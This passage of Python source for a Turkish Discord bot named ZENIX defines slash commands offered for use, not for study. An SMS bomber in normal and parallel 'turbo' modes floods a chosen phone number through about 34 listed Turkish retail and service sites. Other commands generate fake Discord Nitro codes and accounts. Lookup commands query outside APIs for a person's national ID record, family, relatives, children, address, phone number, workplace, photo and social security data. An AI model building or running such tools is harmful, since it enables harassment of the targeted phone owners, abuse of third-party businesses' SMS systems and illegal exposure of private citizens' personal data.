    data = await fetch_json(f"{WAZELY}/exxengen")
    await send_result(interaction, data)


@zenix_group.command(name="nitrogen", description="Rastgele Nitro kodları")
@app_commands.describe(count="Adet (varsayılan: 10)")
async def z_nitro(interaction: discord.Interaction, count: Optional[int] = 10):
    await interaction.response.defer()
    data = await fetch_json(f"{WAZELY}/fakeNitro?count={count}")
    await send_result(interaction, data)


@zenix_group.command(name="pingtest", description="Ping testi")
@app_commands.describe(target="Hedef")
async def z_pingtest(interaction: discord.Interaction, target: str):
    await interaction.response.defer()
    data = await fetch_json(f"{WAZELY}/ping?target={target}")
    await send_result(interaction, data)


@zenix_group.command(name="plaka", description="Plaka sorgusu")
@app_commands.describe(plate="Plaka")
async def z_plaka(interaction: discord.Interaction, plate: str):
    await interaction.response.defer()
    data = await fetch_json(f"{WAZELY}/plaka?plate={plate}")
    await send_result(interaction, data)


@zenix_group.command(name="predunyam", description="Predunyam hesap oluşturucu")
async def z_predunyam(interaction: discord.Interaction):
    await interaction.response.defer()
    data = await fetch_json(f"{WAZELY}/predunyam")
    await send_result(interaction, data)


@zenix_group.command(name="useragent", description="Rastgele User-Agent")
async def z_useragent(interaction: discord.Interaction):
    await interaction.response.defer()
    data = await fetch_json(f"{WAZELY}/randomuseragent")
    await send_result(interaction, data)


# ==================== SMS BOMBER KOMUTU ====================
@zenix_group.command(name="smsbomber", description="SMS Bomber - Normal mod")
@app_commands.describe(
    numara="Telefon numarası (5XXXXXXXXX)",
    adet="Kaç tur (varsayılan: 1)",
    mail="Mail adresi (opsiyonel)",
)
async def z_smsbomber(interaction: discord.Interaction, numara: str, adet: Optional[int] = 1, mail: Optional[str] = None):
    await interaction.response.defer()
    adet = max(1, min(adet, 10))  # en fazla 10 tur
    bomber = SmsBomber(numara, mail or "")
    start = time.time()

    embed = discord.Embed(
        title="💣 ZENIX SMS BOMBER - NORMAL MOD",
        description=f"📱 `{numara}` | 🔁 {adet} tur | ⏳ Çalışıyor...",
        color=COLOR_Z,
        timestamp=datetime.datetime.utcnow()
    )
    embed.set_thumbnail(url=LOGO_URL)
    msg = await interaction.followup.send(embed=embed)

    await bomber.run_normal_async(adet)
    elapsed = round(time.time() - start, 2)

    ok = sum(1 for _, v in bomber.results if v)
    fail = len(bomber.results) - ok

    # Servis bazında özet
    summary = {}
    for name, status in bomber.results:
        if name not in summary:
            summary[name] = {"ok": 0, "fail": 0}
        if status: summary[name]["ok"] += 1
        else:      summary[name]["fail"] += 1

    lines = []
    for name, st in summary.items():
        icon = "✅" if st["ok"] > 0 else "❌"
        lines.append(f"{icon} `{name}` → {st['ok']} başarılı / {st['fail']} başarısız")

    # Embed güncelle
    embed = discord.Embed(
        title="💣 ZENIX SMS BOMBER - NORMAL MOD",
        description=f"📱 `{numara}` | 🔁 {adet} tur | ⏱️ {elapsed}s",
        color=COLOR_OK,
        timestamp=datetime.datetime.utcnow()
    )
    embed.add_field(name="📊 Özet", value=f"✅ Başarılı: **{ok}**\n❌ Başarısız: **{fail}**", inline=False)
    embed.set_thumbnail(url=LOGO_URL)

    full = "\n".join(lines)
    if len(full) > 1000:
        full = full[:1000] + "\n... (devamı dosyada)"
        file = discord.File(io.BytesIO("\n".join(lines).encode("utf-8")), filename="zenix_sms_log.txt")
        await msg.edit(embed=embed)
        await interaction.followup.send(file=file)
    else:
        embed.add_field(name="🔍 Servis Detayı", value=full or "Sonuç yok", inline=False)
        await msg.edit(embed=embed)


# ==================== SMS TURBO ====================
@zenix_group.command(name="turbo", description="SMS Bomber - Turbo mod (paralel)")
@app_commands.describe(
    numara="Telefon numarası (5XXXXXXXXX)",
    adet="Kaç tur (varsayılan: 1)",
    mail="Mail adresi (opsiyonel)",
)
async def z_turbo(interaction: discord.Interaction, numara: str, adet: Optional[int] = 1, mail: Optional[str] = None):
    await interaction.response.defer()
    adet = max(1, min(adet, 10))
    bomber = SmsBomber(numara, mail or "")
    start = time.time()

    embed = discord.Embed(
        title="🚀 ZENIX SMS BOMBER - TURBO MOD",
        description=f"📱 `{numara}` | 🔁 {adet} tur | ⚡ Paralel çalışıyor...",
        color=COLOR_Z,
        timestamp=datetime.datetime.utcnow()
    )
    embed.set_thumbnail(url=LOGO_URL)
    msg = await interaction.followup.send(embed=embed)

    await bomber.run_turbo(adet)
    elapsed = round(time.time() - start, 2)

    ok = sum(1 for _, v in bomber.results if v)
    fail = len(bomber.results) - ok

    summary = {}
    for name, status in bomber.results:
        if name not in summary:
            summary[name] = {"ok": 0, "fail": 0}
        if status: summary[name]["ok"] += 1
        else:      summary[name]["fail"] += 1

    lines = []
    for name, st in summary.items():
        icon = "✅" if st["ok"] > 0 else "❌"
        lines.append(f"{icon} `{name}` → {st['ok']} başarılı / {st['fail']} başarısız")

    embed = discord.Embed(
        title="🚀 ZENIX SMS BOMBER - TURBO MOD",
        description=f"📱 `{numara}` | 🔁 {adet} tur | ⏱️ {elapsed}s",
        color=COLOR_OK,
        timestamp=datetime.datetime.utcnow()
    )
    embed.add_field(name="📊 Özet", value=f"✅ Başarılı: **{ok}**\n❌ Başarısız: **{fail}**", inline=False)
    embed.set_thumbnail(url=LOGO_URL)

    full = "\n".join(lines)
    if len(full) > 1000:
        full = full[:1000] + "\n... (devamı dosyada)"
        file = discord.File(io.BytesIO("\n".join(lines).encode("utf-8")), filename="zenix_turbo_log.txt")
        await msg.edit(embed=embed)
        await interaction.followup.send(file=file)
    else:
        embed.add_field(name="🔍 Servis Detayı", value=full or "Sonuç yok", inline=False)
        await msg.edit(embed=embed)


# ==================== SERVİS LİSTESİ ====================
@zenix_group.command(name="servisler", description="SMS Bomber yüklü servisler")
async def z_servisler(interaction: discord.Interaction):
    services = [
        "kahvedunyasi.com", "wmf.com.tr", "bim.veesk.net", "englishhome.com",
        "suiste.com", "kimgb", "evidea.com", "345dijital.com", "tiklagelsin.com",
        "naosstars.com", "koton.com", "hayatsu.com.tr", "hizliecza.net",
        "metro-tr.com", "filemarket.com.tr", "akasya.com.tr", "akbati.com",
        "komagene.com.tr", "porty.tech", "tasdelen", "uysalmarket.com.tr",
        "yapp.com.tr", "beefull.io", "dominos.com.tr", "frink.com.tr",
        "bodrum.bel.tr", "kofteciyusuf.com", "orwi.app", "coffy.com.tr",
        "hamidiye.istanbul", "money.com.tr", "alixavien.com.tr",
        "jimmykey.com", "ido.com.tr"
    ]
    embed = discord.Embed(
        title="📋 ZENIX SMS BOMBER - Servis Listesi",
        description=f"Toplam **{len(services)}** servis yüklü.",
        color=COLOR_Z
    )
    half = len(services) // 2
    embed.add_field(name="Servisler (1)", value="\n".join(f"• `{s}`" for s in services[:half]), inline=True)
    embed.add_field(name="Servisler (2)", value="\n".join(f"• `{s}`" for s in services[half:]), inline=True)
    embed.set_thumbnail(url=LOGO_URL)
    await interaction.response.send_message(embed=embed)


# ==================== /zenix2 — TC/KİMLİK ====================
@zenix2_group.command(name="tc", description="TC kimlik sorgusu")
@app_commands.describe(tc="TC")
async def z2_tc(interaction: discord.Interaction, tc: str):
    await interaction.response.defer()
    data = await fetch_json(f"{SOLIDARK}/tc.php?tc={tc}")
    if clean_data(data) is None:
        data = await fetch_json(f"{SEARCHULP}/tc/{tc}?key={SEARCH_KEY}")
    await send_result(interaction, data)


@zenix2_group.command(name="tcpro", description="TC Pro detaylı sorgu")
@app_commands.describe(tc="TC")
async def z2_tcpro(interaction: discord.Interaction, tc: str):
    await interaction.response.defer()
    data = await fetch_json(f"{SOLIDARK}/tcpro.php?tc={tc}")
    if clean_data(data) is None:
        data = await fetch_json(f"{SEARCHULP}/tc/{tc}?key={SEARCH_KEY}")
    await send_result(interaction, data)


@zenix2_group.command(name="aile", description="Aile sorgusu")
@app_commands.describe(tc="TC")
async def z2_aile(interaction: discord.Interaction, tc: str):
    await interaction.response.defer()
    data = await fetch_json(f"{SEARCHULP}/aile/{tc}?key={SEARCH_KEY}")
    await send_result(interaction, data)


@zenix2_group.command(name="ailepro", description="Aile Pro sorgusu")
@app_commands.describe(tc="TC")
async def z2_ailepro(interaction: discord.Interaction, tc: str):
    await interaction.response.defer()
    data = await fetch_json(f"{SOLIDARK}/ailepro.php?tc={tc}")
    await send_result(interaction, data)


@zenix2_group.command(name="sulale", description="Sülale sorgusu")
@app_commands.describe(tc="TC")
async def z2_sulale(interaction: discord.Interaction, tc: str):
    await interaction.response.defer()
    data = await fetch_json(f"{SEARCHULP}/sulale/{tc}?key={SEARCH_KEY}")
    await send_result(interaction, data)


@zenix2_group.command(name="cocuk", description="Çocuk sorgusu")
@app_commands.describe(tc="TC")
async def z2_cocuk(interaction: discord.Interaction, tc: str):
    await interaction.response.defer()
    data = await fetch_json(f"{SEARCHULP}/cocuk/{tc}?key={SEARCH_KEY}")
    await send_result(interaction, data)


@zenix2_group.command(name="adres", description="Adres sorgusu")
@app_commands.describe(tc="TC")
async def z2_adres(interaction: discord.Interaction, tc: str):
    await interaction.response.defer()
    data = await fetch_json(f"{SEARCHULP}/adres/{tc}?key={SEARCH_KEY}")
    await send_result(interaction, data)


@zenix2_group.command(name="gsmtc", description="GSM → TC sorgusu")
@app_commands.describe(gsm="GSM")
async def z2_gsmtc(interaction: discord.Interaction, gsm: str):
    await interaction.response.defer()
    data = await fetch_json(f"{SEARCHULP}/gsmtc/{gsm}?key={SEARCH_KEY}")
    await send_result(interaction, data)


@zenix2_group.command(name="tcgsm", description="TC → GSM sorgusu")
@app_commands.describe(tc="TC")
async def z2_tcgsm(interaction: discord.Interaction, tc: str):
    await interaction.response.defer()
    data = await fetch_json(f"{SEARCHULP}/tcgsm/{tc}?key={SEARCH_KEY}")
    await send_result(interaction, data)


@zenix2_group.command(name="isyeri", description="İşyeri sorgusu")
@app_commands.describe(tc="TC")
async def z2_isyeri(interaction: discord.Interaction, tc: str):
    await interaction.response.defer()
    data = await fetch_json(f"{SEARCHULP}/isyeri/{tc}?key={SEARCH_KEY}")
    await send_result(interaction, data)


@zenix2_group.command(name="vesika", description="Vesika sorgusu")
@app_commands.describe(tc="TC")
async def z2_vesika(interaction: discord.Interaction, tc: str):
    await interaction.response.defer()
    data = await fetch_json(f"{SOLIDARK}/vesika.php?tc={tc}")
    await send_result(interaction, data)


@zenix2_group.command(name="sgk", description="SGK sorgusu")
@app_commands.describe(tc="TC")
async def z2_sgk(interaction: discord.Interaction, tc: str):
    await interaction.response.defer()
    data = await fetch_json(f"{SOLIDARK}/sgk.php?tc={tc}")
    await send_result(interaction, data)


@zenix2_group.command(name="idsorgu", description="ID ile e-posta/log sorgusu")
@app_commands.describe(id="ID (örn: 92433932011724800)")
async def z2_idsorgu(interaction: discord.Interaction, id: str):
    await interaction.response.defer()
    data = await fetch_json(f"{ID_API}?id={id}")
    await send_result(interaction, data)


# ==================== /zenix3 — AD/SOYAD ====================
@zenix3_group.command(name="adsoyad", description="Ad soyad arama")
@app_commands.describe(ad="Ad", soyad="Soyad", il="İl", ilce="İlçe", dogumtarihi="Doğum tarihi")
async def z3_adsoyad(interaction: discord.Interaction, ad: str, soyad: Optional[str] = None, il: Optional[str] = None, ilce: Optional[str] = None, dogumtarihi: Optional[str] = None):
    await interaction.response.defer()
    params = {"ad": ad, "key": SEARCH_KEY}
    if soyad:        params["soyad"] = soyad
    if il:           params["il"] = il
    if ilce:         params["ilce"] = ilce
    if dogumtarihi:  params["dogumtarihi"] = dogumtarihi
    data = await fetch_json(f"{SEARCHULP}/adsoyad?{urlencode(params)}")
    await send_result(interaction, data)


@zenix3_group.command(name="adsoyadil", description="Ad soyad il ilçe sorgusu")
@app_commands.describe(ad="Ad", soyad="Soyad", il="İl", ilce="İlçe")
async def z3_adsoyadil(interaction: discord.Interaction, ad: str, soyad: str, il: str, ilce: str):
    await interaction.response.defer()
    data = await fetch_json(f"{SOLIDARK}/adsoyad.php?ad={ad}&soyad={soyad}&il={il}&ilce={ilce}")
    await send_result(interaction, data)


@zenix3_group.command(name="adililce", description="Ad il ilçe sorgusu")
@app_commands.describe(ad="Ad", il="İl", ilce="İlçe")
async def z3_adililce(interaction: discord.Interaction, ad: str, il: str, ilce: str):
    await interaction.response.defer()
    data = await fetch_json(f"{SOLIDARK}/adililce.php?ad={ad}&il={il}&ilce={ilce}")
    await send_result(interaction, data)


# ==================== GENEL ====================
@bot.tree.command(name="ping", description="Bot gecikmesi")
async def ping(interaction: discord.Interaction):
    await interaction.response.send_message(f"```\n{round(bot.latency * 1000)}ms\n```")


@bot.tree.command(name="yardim", description="ZENIX komutları")
async def yardim(interaction: discord.Interaction):
    g1 = [c.name for c in zenix_group.commands]
    g2 = [c.name for c in zenix2_group.commands]
    g3 = [c.name for c in zenix3_group.commands]

    embed = discord.Embed(
        title="✨  ZENIX CHECKER  ✨",
        description="🔎 Tüm komutlar aşağıdadır.\n━━━━━━━━━━━━━━━━━━━━━━━━━━",
        color=COLOR_Z,
        timestamp=datetime.datetime.utcnow()
    )
    embed.add_field(name="⚡ `/zenix` — Genel & SMS", value="`" + "` `".join(sorted(g1)) + "`", inline=False)
    embed.add_field(name="🪪 `/zenix2` — TC & Kimlik", value="`" + "` `".join(sorted(g2)) + "`", inline=False)
    embed.add_field(name="👤 `/zenix3` — Ad/Soyad", value="`" + "` `".join(sorted(g3)) + "`", inline=False)
    embed.add_field(
        name="💣 SMS BOMBER KULLANIM",
        value="`/zenix smsbomber numara:5XX adet:1 mail:x@y.com`\n"
              "`/zenix turbo numara:5XX adet:1 mail:x@y.com`\n"
              "`/zenix servisler`",
        inline=False
    )
    embed.set_thumbnail(url=LOGO_URL)
    embed.set_image(url=LOGO_URL)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="hosgeldin", description="ZENIX hoş geldin mesajı")
async def hosgeldin(interaction: discord.Interaction):
    await interaction.response.send_message(embed=build_welcome_embed())


# ==================== KAYIT ====================
bot.tree.add_command(zenix_group)
bot.tree.add_command(zenix2_group)
bot.tree.add_command(zenix3_group)


# ==================== ÇALIŞTIR ====================
if __name__ == "__main__":
    if not DISCORD_TOKEN:
        print("❌ DISCORD_TOKEN bulunamadı!")
        exit(1)
    print("🚀 ZENIX başlatılıyor...")
    bot.run(DISCORD_TOKEN)
